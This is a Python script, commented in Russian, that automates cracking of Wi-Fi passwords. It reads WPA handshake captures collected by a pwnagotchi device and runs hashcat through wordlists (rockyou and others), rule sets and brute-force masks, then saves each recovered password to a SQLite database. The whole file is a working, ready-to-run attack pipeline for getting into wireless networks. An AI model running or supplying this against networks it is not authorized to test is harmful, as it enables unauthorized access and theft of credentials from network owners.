import subprocess
import sqlite3
from pathlib import Path

BASE = Path.home() / "pwnagotchi"
GOOD = BASE / "data/good_pcaps"
HASHES = BASE / "data/hashes"
DB = BASE / "db/networks.db"
WORDLIST_DIR = Path.home() / "wordlists"
RULE_DIR = WORDLIST_DIR / "rules"

WORDLISTS = [
    WORDLIST_DIR / "rockyou.txt",
    WORDLIST_DIR / "probable-v2-top12000.txt",
    WORDLIST_DIR / "kaonashi.txt",
]
RULES = [
    RULE_DIR / "best64.rule",
    RULE_DIR / "OneRuleToRuleThemAll.rule",
]
MASKS = [
    "?d?d?d?d?d?d?d?d",
    "?d?d?d?d?d?d?d?d?d",
    "?l?l?l?l?l?l?l?l",
    "?l?l?l?l?l?l?l?l?d?d",
]

# Базовые флаги для M2: Metal-бэкенд, оптимизация, WPA-длины
BASE_FLAGS = [
    "-m", "22000",
    "-w", "4",
    "--quiet",
    "--force",
]

def run_hashcat(args: list[str]) -> None:
    subprocess.run(["hashcat"] + BASE_FLAGS + args)

def get_cracked_password(hashfile: Path) -> str | None:
    result = subprocess.run(
        ["hashcat", "-m", "22000", str(hashfile), "--show"],
        capture_output=True, text=True,
    )
    for line in result.stdout.strip().splitlines():
        if ":" in line:
            return line.split(":")[-1]
    return None

DB.parent.mkdir(parents=True, exist_ok=True)
conn = sqlite3.connect(DB)
cur = conn.cursor()

for pcap in GOOD.glob("*.pcap"):
    hashfile = HASHES / (pcap.stem + ".22000")

    # Пропускаем уже взломанные
    cur.execute("SELECT password FROM captures WHERE filename=?", (pcap.name,))
    row = cur.fetchone()
    if row and row[0]:
        continue

    if not hashfile.exists() or hashfile.stat().st_size == 0:
        continue

    cracked = False

    # Этап 1 — словари
    for wl in WORDLISTS:
        if not wl.exists():
            continue
        print(f"[*] Wordlist: {wl.name}")
        run_hashcat([str(hashfile), str(wl)])
        if get_cracked_password(hashfile):
            cracked = True
            break

    # Этап 2 — правила (только если не взломан)
    if not cracked:
        for wl in WORDLISTS:
            if not wl.exists() or cracked:
                continue
            for rule in RULES:
                if not rule.exists():
                    continue
                print(f"[*] Rule: {wl.name} + {rule.name}")
                run_hashcat([str(hashfile), str(wl), "-r", str(rule)])
                if get_cracked_password(hashfile):
                    cracked = True
                    break

    # Этап 3 — маски (только если не взломан)
    if not cracked:
        for mask in MASKS:
            print(f"[*] Mask: {mask}")
            run_hashcat([str(hashfile), "-a", "3", mask])
            if get_cracked_password(hashfile):
                break

    # Сохраняем результат
    password = get_cracked_password(hashfile)
    if password:
        print(f"[+] Found: {password}")
        cur.execute(
            "UPDATE captures SET hashfile=?, password=? WHERE filename=?",
            (str(hashfile), password, pcap.name),
        )
        conn.commit()

conn.close()